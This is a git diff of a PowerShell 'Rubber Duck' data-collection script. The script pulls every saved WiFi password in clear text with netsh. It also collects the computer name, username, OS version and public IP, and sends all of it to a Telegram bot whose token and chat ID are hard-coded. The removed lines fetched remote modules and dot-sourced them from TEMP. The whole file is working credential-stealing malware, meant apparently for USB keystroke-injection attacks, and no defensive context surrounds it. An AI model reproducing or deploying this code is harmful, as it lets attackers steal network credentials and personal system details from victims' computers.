@@ -1,8 +1,8 @@
 <#
 .SYNOPSIS
-    Rubber Duck Data Collection Script
+    Rubber Duck Data Collection Script - Fixed Version
 .DESCRIPTION
-    Collects WiFi passwords and basic system info, then sends to Telegram bot.
+    Collects WiFi passwords and system info, then sends to Telegram bot.
 .NOTES
     GitHub: https://github.com/OGRYZOK-dev/RubberDuck
 #>
@@ -12,92 +12,102 @@ $TOKEN = "6942623726:AAH6yXcm9EgAhbUVxCmphZF3o6H8XScPOFw"
 $CHAT_ID = "6525689863"
 $REPO_URL = "https://raw.githubusercontent.com/OGRYZOK-dev/RubberDuck/main/"
 
-# Temporary directory
-$tempDir = "$env:TEMP\RubberDuck"
-try {
-    if (-not (Test-Path $tempDir)) { New-Item -ItemType Directory -Path $tempDir -Force | Out-Null }
-}
-catch {
-    exit 1
-}
-
-# Improved module download with error handling
-function Download-Module {
-    param ($moduleName)
-    $url = "$REPO_URL/modules/$moduleName"
-    $output = "$tempDir\$moduleName"
+# Function to send Telegram message (built-in to avoid module dependency)
+function Send-TelegramMessage {
+    param (
+        [string]$Message
+    )
+    
+    $url = "https://api.telegram.org/bot$TOKEN/sendMessage"
+    $body = @{
+        chat_id = $CHAT_ID
+        text = $Message
+    }
     
     try {
-        Write-Output "Downloading module: $moduleName"
-        (New-Object System.Net.WebClient).DownloadFile($url, $output)
+        $jsonBody = $body | ConvertTo-Json
+        Invoke-RestMethod -Uri $url -Method Post -Body $jsonBody -ContentType "application/json" -TimeoutSec 10 | Out-Null
         return $true
     }
     catch {
-        Write-Output "Failed to download module: $moduleName"
+        Write-Output "[!] Telegram send error: $_"
         return $false
     }
 }
 
-# Import modules with better error handling
-$modules = @("wifi.ps1", "system.ps1", "telegram.ps1")
-foreach ($module in $modules) {
-    if (Download-Module $module) {
-        try {
-            . "$tempDir\$module"
-            Write-Output "Successfully loaded module: $module"
+# Function to get WiFi passwords (built-in)
+function Get-WifiPasswords {
+    try {
+        $output = @()
+        $wifiProfiles = (netsh wlan show profiles) | Where-Object { $_ -match "All User Profile" } | ForEach-Object { $_.Split(":")[1].Trim() }
+        
+        if (-not $wifiProfiles) { return "No WiFi profiles found" }
+
+        foreach ($profile in $wifiProfiles) {
+            try {
+                $profileInfo = netsh wlan show profile name="$profile" key=clear
+                $password = ($profileInfo | Select-String "Key Content").ToString().Split(":")[1].Trim()
+                
+                $output += "SSID: $profile"
+                $output += "Password: $password"
+                $output += "---------------------"
+            }
+            catch {
+                $output += "Error processing profile: $profile"
+                continue
+            }
         }
-        catch {
-            Write-Output "Failed to load module: $module"
-            continue
-        }
+        
+        return ($output -join "`n")
+    }
+    catch {
+        return "Error in WiFi module: $_"
     }
 }
 
-# Main collection function with try-catch
-function Collect-AllData {
-    $output = @()
-    
+# Function to get system info (built-in)
+function Get-SystemInfo {
     try {
-        $output += "=== System Information ==="
-        $output += Get-SystemInfo
+        $output = @()
+        
+        $output += "Computer Name: $env:COMPUTERNAME"
+        $output += "Username: $env:USERNAME"
+        $output += "OS Version: $([System.Environment]::OSVersion.VersionString)"
+        $output += "Date/Time: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
+        $output += "Public IP: $(try { (Invoke-WebRequest -Uri 'https://api.ipify.org' -TimeoutSec 3).Content } catch { 'Unknown' })"
+        
+        return ($output -join "`n")
     }
     catch {
-        $output += "Error getting system info: $_"
+        return "Error in system module: $_"
     }
-    
-    try {
-        $output += "`n=== WiFi Passwords ==="
-        $output += Get-WifiPasswords
-    }
-    catch {
-        $output += "Error getting WiFi passwords: $_"
-    }
-    
-    return ($output -join "`n")
 }
 
-# Execute with comprehensive error handling
+# Main execution
 try {
-    $collectedData = Collect-AllData
+    $result = @()
     
-    # Truncate if too long for Telegram (max 4096 chars)
-    if ($collectedData.Length -gt 4000) {
-        $collectedData = $collectedData.Substring(0, 4000) + "...[TRUNCATED]"
+    $result += "=== System Information ==="
+    $result += Get-SystemInfo
+    
+    $result += "`n=== WiFi Passwords ==="
+    $result += Get-WifiPasswords
+    
+    $finalOutput = $result -join "`n"
+    
+    # Truncate if too long for Telegram
+    if ($finalOutput.Length -gt 4000) {
+        $finalOutput = $finalOutput.Substring(0, 4000) + "...[TRUNCATED]"
     }
     
-    Send-TelegramMessage -Token $TOKEN -ChatID $CHAT_ID -Message $collectedData
+    Send-TelegramMessage -Message $finalOutput
 }
 catch {
     $errorMsg = "Main execution error: $_"
     try {
-        Send-TelegramMessage -Token $TOKEN -ChatID $CHAT_ID -Message $errorMsg
+        Send-TelegramMessage -Message $errorMsg
     }
     catch {
-        # Final fallback if even Telegram fails
         Write-Output $errorMsg
     }
-}
-finally {
-    # Cleanup with error suppression
-    Remove-Item -Path $tempDir -Recurse -Force -ErrorAction SilentlyContinue
 }
